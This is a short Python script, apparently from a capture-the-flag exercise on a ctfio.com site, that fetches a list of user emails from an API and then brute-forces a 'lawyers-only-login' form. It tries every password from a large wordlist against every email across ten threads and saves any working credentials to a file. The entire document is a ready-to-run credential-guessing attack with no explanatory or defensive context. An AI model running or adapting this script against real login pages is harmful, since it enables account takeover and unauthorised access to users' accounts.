import requests
from concurrent.futures import ThreadPoolExecutor

THREADS = 10

r = requests.Session()

def get_users():
    return (r.get('https://data.sunstone.ctfio.com/users').json())['users']

emails = [user['email'] for user in get_users()]
wordlist = [pw.strip() for pw in open('../wordlists/passwords-large.txt')]

def try_login(email, password):
    return r.post('https://sunstone.ctfio.com/lawyers-only-login', data={
        "email" : email,
        "password" : password
    })

def try_for_each(password):
    for email in emails:
        if "Invalid" not in try_login(email, password).text:
            print(f"found {email} {password}")
            out = open('brtout', 'w')
            out.write(email)
            out.write('\n')
            out.write(password)

with ThreadPoolExecutor(max_workers=THREADS) as e:
    e.map(try_for_each, wordlist)

